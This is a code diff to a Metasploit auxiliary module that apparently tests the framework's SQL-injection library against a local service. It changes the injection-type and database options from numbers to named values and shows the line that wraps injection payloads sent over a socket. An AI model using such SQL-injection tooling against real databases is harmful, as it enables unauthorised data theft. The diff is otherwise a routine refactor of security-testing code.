@@ -27,12 +27,12 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RHOST('127.0.0.1'),
         OptInt.new('RPORT', [true, 'The target port', 1337]),
         OptString.new('TARGETURI', [true, 'The target URI', '/']),
-        OptInt.new('SQLI_TYPE', [true, '0)Regular. 1) BooleanBlind. 2)TimeBlind.', 0]),
+        OptEnum.new('SQLI_TYPE', [true, 'The type of SQL injection to test', 'Regular', %w(Regular BooleanBlind TimeBlind)]),
         OptBool.new('SAFE', [false, 'Use safe mode', false]),
         OptString.new('ENCODER', [false, 'an encoder to use (hex for example)', '']),
         OptBool.new('HEX_ENCODE_STRINGS', [false, 'Replace strings in the query with hex numbers?', false]),
         OptInt.new('TRUNCATION_LENGTH', [true, 'Test SQLi with truncated output (0 or negative to disable)', 0]),
-        OptInt.new('DBMS', [ true, '0)MySQL/MariaDB. 1) PostgreSQL. 2) Sqlite. 3) MSSQL.', 0])
+        OptEnum.new('DBMS', [ true, 'The DBMS to target', 'MariaDB', %w(MariaDB PostgreSQL Sqlite MSSQL)])
       ]
     )
   end
@@ -92,7 +92,7 @@ class MetasploitModule < Msf::Auxiliary
                        }) do |payload|
       sock = TCPSocket.open(datastore['RHOST'], datastore['RPORT'])
 
-      if datastore['DBMS'] == 3 # MSSQL
+      if datastore['DBMS'] == 'MSSQL'
         sock.puts("0;#{payload} --")
       else
         sock.puts('0 or ' + payload + ' --')
@@ -124,30 +124,30 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     case datastore['SQLI_TYPE']
-    when 0
+    when 'Regular'
       @dbms = case datastore['DBMS']
-        when 0 then Msf::Exploit::SQLi::MySQLi::Common
-        when 1 then Msf::Exploit::SQLi::PostgreSQLi::Common
-        when 2 then Msf::Exploit::SQLi::SQLitei::Common
-        when 3 then Msf::Exploit::SQLi::Mssqli::Common
+        when 'MariaDB' then Msf::Exploit::SQLi::MySQLi::Common
+        when 'PostgreSQL' then Msf::Exploit::SQLi::PostgreSQLi::Common
+        when 'Sqlite' then Msf::Exploit::SQLi::SQLitei::Common
+        when 'MSSQL' then Msf::Exploit::SQLi::Mssqli::Common
         else print_bad("Unsupported target")
       end
       reflected
-    when 1
+    when 'BooleanBlind'
       @dbms = case datastore['DBMS']
-        when 0 then Msf::Exploit::SQLi::MySQLi::BooleanBasedBlind
-        when 1 then Msf::Exploit::SQLi::PostgreSQLi::BooleanBasedBlind
-        when 2 then Msf::Exploit::SQLi::SQLitei::BooleanBasedBlind
-        when 3 then Msf::Exploit::SQLi::Mssqli::BooleanBasedBlind
+        when 'MariaDB' then Msf::Exploit::SQLi::MySQLi::BooleanBasedBlind
+        when 'PostgreSQL' then Msf::Exploit::SQLi::PostgreSQLi::BooleanBasedBlind
+        when 'Sqlite' then Msf::Exploit::SQLi::SQLitei::BooleanBasedBlind
+        when 'MSSQL' then Msf::Exploit::SQLi::Mssqli::BooleanBasedBlind
         else print_bad("Unsupported target")
       end
       boolean_blind
-    when 2
+    when 'TimeBlind'
       @dbms = case datastore['DBMS']
-        when 0 then Msf::Exploit::SQLi::MySQLi::TimeBasedBlind
-        when 1 then Msf::Exploit::SQLi::PostgreSQLi::TimeBasedBlind
-        when 2 then Msf::Exploit::SQLi::SQLitei::TimeBasedBlind
-        when 3 then Msf::Exploit::SQLi::Mssqli::TimeBasedBlind
+        when 'MariaDB' then Msf::Exploit::SQLi::MySQLi::TimeBasedBlind
+        when 'PostgreSQL' then Msf::Exploit::SQLi::PostgreSQLi::TimeBasedBlind
+        when 'Sqlite' then Msf::Exploit::SQLi::SQLitei::TimeBasedBlind
+        when 'MSSQL' then Msf::Exploit::SQLi::Mssqli::TimeBasedBlind
         else print_bad("Unsupported target")
       end
       time_blind
